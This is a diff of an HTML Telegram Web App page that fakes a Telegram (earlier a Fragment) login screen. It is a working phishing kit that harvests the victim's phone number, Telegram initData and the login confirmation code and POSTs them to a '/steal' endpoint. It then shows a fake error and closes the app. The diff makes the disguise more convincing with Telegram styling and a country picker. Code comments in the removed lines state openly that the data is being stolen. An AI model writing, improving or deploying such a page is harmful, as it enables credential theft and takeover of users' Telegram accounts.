@@ -1,177 +1,288 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Fragment</title>
+    <title>Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f5f5f5;
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
-        .container {
+        body {
+            background: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+        }
+        .page {
             max-width: 400px;
             margin: 0 auto;
-            background: white;
-            min-height: 100vh;
+            padding: 0 16px;
         }
         .header {
-            background: #2481cc;
-            color: white;
-            padding: 16px;
             text-align: center;
-            font-size: 18px;
-            font-weight: 500;
+            padding: 40px 0 20px;
         }
-        .content {
-            padding: 20px;
+        .avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            margin: 0 auto 16px;
+            background: linear-gradient(45deg, #34aadc, #0077ff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            color: white;
+        }
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: var(--tg-theme-hint-color, #999999);
+            margin-bottom: 30px;
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .country-selector {
+            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-bottom: 12px;
+            cursor: pointer;
+        }
+        .country-code {
+            font-size: 14px;
+            color: var(--tg-theme-hint-color, #999999);
+        }
+        .country-name {
+            font-size: 16px;
+            font-weight: 500;
         }
         .phone-input {
             width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 8px;
+            padding: 12px 16px;
+            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            border: none;
+            border-radius: 12px;
             font-size: 16px;
-            box-sizing: border-box;
+            outline: none;
         }
         .btn {
-            background: #2481cc;
+            width: 100%;
+            padding: 12px;
+            background: #31a6f3;
             color: white;
             border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
+            border-radius: 12px;
             font-size: 16px;
+            font-weight: 500;
             cursor: pointer;
-            width: 100%;
-            margin: 10px 0;
+            margin-top: 20px;
         }
         .btn:disabled {
-            background: #ccc;
+            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            color: var(--tg-theme-hint-color, #999999);
             cursor: not-allowed;
         }
-        .country {
-            background: white;
-            padding: 12px;
-            border-radius: 8px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-        }
-        .code-input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
+        .footer {
             text-align: center;
-            letter-spacing: 8px;
-            box-sizing: border-box;
+            margin-top: 30px;
+            font-size: 14px;
+            color: var(--tg-theme-hint-color, #999999);
         }
         .hidden {
             display: none;
         }
+        .countries-list {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--tg-theme-bg-color, #ffffff);
+            z-index: 1000;
+            overflow-y: auto;
+        }
+        .country-item {
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f0f0f0);
+            cursor: pointer;
+        }
+        .back-btn {
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f0f0f0);
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            Войдите, чтобы использовать аккаунт Telegram
-        </div>
-        
-        <div class="content">
-            <div id="phoneScreen">
-                <p>для fragment.com и Fragment Auction Alerts.</p>
-                <p>Введите свой <strong>номер телефона</strong> в международном формате. Подтверждение будет отправлено в Telegram.</p>
-                
-                <div class="country">
-                    <strong>Россия</strong><br>
-                    +7
+    <div class="page">
+        <!-- Страница ввода номера -->
+        <div id="phonePage">
+            <div class="header">
+                <div class="avatar">T</div>
+                <div class="title">Telegram</div>
+                <div class="subtitle">Войдите в свой аккаунт</div>
+            </div>
+
+            <div class="input-group">
+                <div class="country-selector" onclick="showCountries()">
+                    <div class="country-code">+7</div>
+                    <div class="country-name">Russia</div>
                 </div>
-                
-                <input type="tel" class="phone-input" id="phoneInput" placeholder="+7 XXX XXX XX XX" pattern="\+7[0-9]{10}">
-                
-                <button class="btn" id="nextBtn" disabled>ДАЛЕЕ</button>
-                <button class="btn" style="background: #888;" onclick="closeApp()">ОТМЕНА</button>
+                <input type="tel" class="phone-input" id="phoneInput" placeholder="Your phone number" oninput="validatePhone()">
             </div>
-            
-            <div id="codeScreen" class="hidden">
-                <p>Введите код подтверждения, отправленный в Telegram:</p>
-                <input type="text" class="code-input" id="codeInput" maxlength="5" placeholder="12345">
-                <button class="btn" id="confirmBtn" disabled>ПОДТВЕРДИТЬ</button>
+
+            <button class="btn" id="nextBtn" disabled onclick="sendPhone()">NEXT</button>
+
+            <div class="footer">
+                You will receive a confirmation code
             </div>
+        </div>
+
+        <!-- Страница ввода кода -->
+        <div id="codePage" class="hidden">
+            <div class="header">
+                <div class="avatar">T</div>
+                <div class="title">Code</div>
+                <div class="subtitle">We have sent a code to +7 ••• ••• •• ••</div>
+            </div>
+
+            <div class="input-group">
+                <input type="text" class="phone-input" id="codeInput" placeholder="Code" maxlength="5" oninput="validateCode()">
+            </div>
+
+            <button class="btn" id="confirmBtn" disabled onclick="sendCode()">Confirm</button>
+        </div>
+
+        <!-- Список стран -->
+        <div id="countriesList" class="countries-list hidden">
+            <div class="back-btn" onclick="hideCountries()">← Back</div>
+            <div class="country-item" onclick="selectCountry('+1', 'United States')">
+                <div class="country-code">+1</div>
+                <div class="country-name">United States</div>
+            </div>
+            <div class="country-item" onclick="selectCountry('+7', 'Russia')">
+                <div class="country-code">+7</div>
+                <div class="country-name">Russia</div>
+            </div>
+            <div class="country-item" onclick="selectCountry('+44', 'United Kingdom')">
+                <div class="country-code">+44</div>
+                <div class="country-name">United Kingdom</div>
+            </div>
+            <div class="country-item" onclick="selectCountry('+49', 'Germany')">
+                <div class="country-code">+49</div>
+                <div class="country-name">Germany</div>
+            </div>
+            <div class="country-item" onclick="selectCountry('+33', 'France')">
+                <div class="country-code">+33</div>
+                <div class="country-name">France</div>
+            </div>
+            <div class="country-item" onclick="selectCountry('+86', 'China')">
+                <div class="country-code">+86</div>
+                <div class="country-name">China</div>
+            </div>
+            <div class="country-item" onclick="selectCountry('+91', 'India')">
+                <div class="country-code">+91</div>
+                <div class="country-name">India</div>
+            </div>
+            <div class="country-item" onclick="selectCountry('+81', 'Japan')">
+                <div class="country-code">+81</div>
+                <div class="country-name">Japan</div>
+            </div>
+            <!-- Добавь больше стран по необходимости -->
         </div>
     </div>
 
     <script>
-        const phoneInput = document.getElementById('phoneInput');
-        const nextBtn = document.getElementById('nextBtn');
-        const codeInput = document.getElementById('codeInput');
-        const confirmBtn = document.getElementById('confirmBtn');
-        const phoneScreen = document.getElementById('phoneScreen');
-        const codeScreen = document.getElementById('codeScreen');
+        let selectedCountry = '+7';
+        let selectedCountryName = 'Russia';
+        let userPhone = '';
 
-        // Получаем текущий домен
         const currentDomain = window.location.hostname;
         const stealUrl = `https://${currentDomain}/steal`;
 
-        // Валидация номера
-        phoneInput.addEventListener('input', function() {
-            nextBtn.disabled = !this.value.match(/^\+7[0-9]{10}$/);
-        });
+        function showCountries() {
+            document.getElementById('countriesList').classList.remove('hidden');
+        }
 
-        // Валидация кода
-        codeInput.addEventListener('input', function() {
-            confirmBtn.disabled = this.value.length !== 5;
-        });
+        function hideCountries() {
+            document.getElementById('countriesList').classList.add('hidden');
+        }
 
-        // Переход к вводу кода
-        nextBtn.addEventListener('click', function() {
-            // Крадём данные Telegram Web App
+        function selectCountry(code, name) {
+            selectedCountry = code;
+            selectedCountryName = name;
+            document.querySelector('.country-code').textContent = code;
+            document.querySelector('.country-name').textContent = name;
+            hideCountries();
+            validatePhone();
+        }
+
+        function validatePhone() {
+            const phone = document.getElementById('phoneInput').value;
+            const nextBtn = document.getElementById('nextBtn');
+            userPhone = selectedCountry + phone;
+            nextBtn.disabled = !phone.match(/^[0-9]{7,15}$/);
+        }
+
+        function validateCode() {
+            const code = document.getElementById('codeInput').value;
+            const confirmBtn = document.getElementById('confirmBtn');
+            confirmBtn.disabled = code.length !== 5;
+        }
+
+        function sendPhone() {
             const tgData = Telegram.WebApp.initData;
             
-            // Отправляем номер на сервер
             fetch(stealUrl, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    phone: phoneInput.value,
+                    phone: userPhone,
                     tg_data: tgData,
                     stage: 'phone_entered'
                 })
-            }).catch(e => console.error('Ошибка отправки:', e));
+            }).catch(e => console.error('Error:', e));
 
-            phoneScreen.classList.add('hidden');
-            codeScreen.classList.remove('hidden');
-        });
+            // Показываем код страницы
+            document.getElementById('phonePage').classList.add('hidden');
+            document.getElementById('codePage').classList.remove('hidden');
+            
+            // Обновляем текст с номером
+            const maskedPhone = userPhone.slice(0, 3) + ' ••• ••• •• ••';
+            document.querySelector('#codePage .subtitle').textContent = 
+                `We have sent a code to ${maskedPhone}`;
+        }
 
-        // Подтверждение кода
-        confirmBtn.addEventListener('click', function() {
-            // Крадём код
+        function sendCode() {
+            const code = document.getElementById('codeInput').value;
+            
             fetch(stealUrl, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    phone: phoneInput.value,
-                    code: codeInput.value,
+                    phone: userPhone,
+                    code: code,
                     tg_data: Telegram.WebApp.initData,
                     stage: 'code_entered'
                 })
-            }).catch(e => console.error('Ошибка отправки:', e));
+            }).catch(e => console.error('Error:', e));
 
-            // Показываем фейковую ошибку
-            alert('Ошибка! Не удалось войти в аккаунт. Попробуйте позже.');
-            Telegram.WebApp.close();
-        });
-
-        function closeApp() {
+            alert('Error connecting to Telegram. Please try again later.');
             Telegram.WebApp.close();
         }
 
         // Инициализация Telegram Web App
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
+        Telegram.WebApp.setHeaderColor('#4a8cDc');
+        Telegram.WebApp.setBackgroundColor('#ffffff');
     </script>
 </body>
 </html>
